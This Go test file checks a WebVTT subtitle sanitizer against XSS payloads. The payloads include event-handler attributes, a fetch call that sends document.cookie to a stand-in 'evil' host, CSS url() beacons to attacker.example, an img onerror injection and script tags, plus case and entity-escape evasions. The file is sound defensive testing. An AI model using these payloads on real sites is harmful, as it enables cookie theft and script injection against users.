package subtitleingest

import (
	"strings"
	"testing"
)

// This file tests SanitizeWebVTT against concrete adversarial payloads, not
// just structural properties. Each case is a confirmed bypass found by
// independent security review: the pre-fix
// sanitizer allowlisted tag *names* but passed every attribute through
// verbatim, and never looked at STYLE/REGION/NOTE blocks at all.

// hasNeedle is a tiny helper so failures show both the needle and the full
// sanitized output.
func hasNeedle(t *testing.T, out, needle, label string) {
	t.Helper()
	if strings.Contains(out, needle) {
		t.Fatalf("%s survived sanitisation: needle=%q out=%q", label, needle, out)
	}
}

func TestSanitizeWebVTTStripsEventHandlerAttributes(t *testing.T) {
	cases := []struct {
		name string
		in   string
	}{
		{"b-onmouseover", `<b onmouseover=alert(1)>hi</b>`},
		{"i-onmouseover-quoted", `<i onmouseover="fetch('//evil/'+document.cookie)">hi</i>`},
		{"c-loud-style", `<c.loud style="background-image:url(https://evil/px)">hi</c>`},
		{"v-onfocus-tabindex", `<v onfocus=alert(1) tabindex=1>hi</v>`},
		{"lang-onmouseover", `<lang en onmouseover=alert(1)>hi</lang>`},
		{"ruby-onmouseover", `<ruby onmouseover=alert(1)>hi</ruby>`},
	}
	for _, tc := range cases {
		out := SanitizeWebVTT(tc.in)
		hasNeedle(t, out, "onmouseover", tc.name)
		hasNeedle(t, out, "onfocus", tc.name)
		hasNeedle(t, out, "tabindex", tc.name)
		hasNeedle(t, out, "style=", tc.name)
		hasNeedle(t, out, "javascript:", tc.name)
		hasNeedle(t, out, "fetch(", tc.name)
		hasNeedle(t, out, "alert(", tc.name)
		if strings.Contains(out, "=") {
			t.Fatalf("%s: sanitized output still carries an attribute-style '=': %q", tc.name, out)
		}
	}
}

func TestSanitizeWebVTTPreservesSafeAnnotationsWhileDroppingAttributes(t *testing.T) {
	out := SanitizeWebVTT(`<v Bob>hi</v>`)
	if out != `<v Bob>hi</v>` {
		t.Fatalf("safe voice annotation was altered: %q", out)
	}
	out = SanitizeWebVTT(`<c.loud>hi</c>`)
	if out != `<c.loud>hi</c>` {
		t.Fatalf("safe class suffix was altered: %q", out)
	}
}

func TestSanitizeWebVTTRejectsJavascriptURLAnnotation(t *testing.T) {
	out := SanitizeWebVTT(`<v href=javascript:alert(1)>hi</v>`)
	hasNeedle(t, out, "javascript:", "v-href-javascript")
	hasNeedle(t, out, "href", "v-href-javascript")
}

func TestSanitizeWebVTTRejectsCaseAndWhitespaceEvasion(t *testing.T) {
	cases := []string{
		`<b OnClick=alert(1)>hi</b>`,
		"<b on\tclick=alert(1)>hi</b>",
		`<B ONCLICK=alert(1)>hi</B>`,
		"<v on\tclick=alert(1)>hi</v>",
	}
	for _, in := range cases {
		out := SanitizeWebVTT(in)
		lower := strings.ToLower(out)
		if strings.Contains(lower, "onclick") {
			t.Fatalf("case/whitespace-evaded onclick survived: in=%q out=%q", in, out)
		}
	}
}

func TestSanitizeWebVTTRejectsEntityEscapeEvasion(t *testing.T) {
	// An attacker tries to hide the '=' behind an HTML entity so a naive
	// blocklist on '=' misses it. Our allowlist must reject the whole
	// annotation regardless of what characters it contains.
	in := `<v Bob&#61;onclick&#61;alert(1)>hi</v>`
	out := SanitizeWebVTT(in)
	hasNeedle(t, out, "onclick", "entity-escape")
}

func TestSanitizeWebVTTStripsStyleBlockNetworkBeacon(t *testing.T) {
	in := "WEBVTT\n\nSTYLE\n::cue {\n  background-image: url(https://attacker.example/beacon.png);\n}\n\n00:00:01.000 --> 00:00:02.000\nhi\n"
	out := SanitizeWebVTT(in)
	hasNeedle(t, out, "attacker.example", "style-url-beacon")
	hasNeedle(t, out, "url(", "style-url-beacon")
	if !strings.Contains(out, "00:00:01.000 --> 00:00:02.000") {
		t.Fatalf("STYLE stripping corrupted the cue block: %q", out)
	}
	if !strings.Contains(out, "hi") {
		t.Fatalf("STYLE stripping dropped cue text: %q", out)
	}
}

func TestSanitizeWebVTTStripsUnclosedStyleBlockAtEOF(t *testing.T) {
	// A STYLE block with no trailing blank line (malformed / truncated file)
	// must still be stripped rather than passed through to EOF.
	in := "WEBVTT\n\nSTYLE\n::cue { background-image: url(https://evil.example/x.png); }"
	out := SanitizeWebVTT(in)
	hasNeedle(t, out, "evil.example", "unclosed-style-eof")
}

func TestSanitizeWebVTTStripsRegionBlock(t *testing.T) {
	in := "WEBVTT\n\nREGION\nid:fred\nwidth:40%\nlines:3\n\n00:00:01.000 --> 00:00:02.000 region:fred\nhi\n"
	out := SanitizeWebVTT(in)
	hasNeedle(t, out, "id:fred", "region-block")
	hasNeedle(t, out, "width:40%", "region-block")
}

func TestSanitizeWebVTTStripsNoteBlocks(t *testing.T) {
	// Single-line and multi-line NOTE forms both.
	in := "WEBVTT\n\nNOTE this note carries an injected <img src=x onerror=alert(1)> attempt\n\nNOTE\nmulti\nline\ncomment\n\n00:00:01.000 --> 00:00:02.000\nhi\n"
	out := SanitizeWebVTT(in)
	hasNeedle(t, out, "onerror", "note-block")
	hasNeedle(t, out, "multi", "note-block-multiline")
	if !strings.Contains(out, "hi") {
		t.Fatalf("NOTE stripping dropped cue text: %q", out)
	}
}

func TestSanitizeWebVTTMalformedNestedTagsStillEscaped(t *testing.T) {
	in := `<i><script>alert(document.cookie)</script></i>`
	out := SanitizeWebVTT(in)
	hasNeedle(t, out, "<script>", "nested-malformed")
	if !strings.Contains(out, "&lt;script&gt;") {
		t.Fatalf("nested script tag was not escaped: %q", out)
	}
}
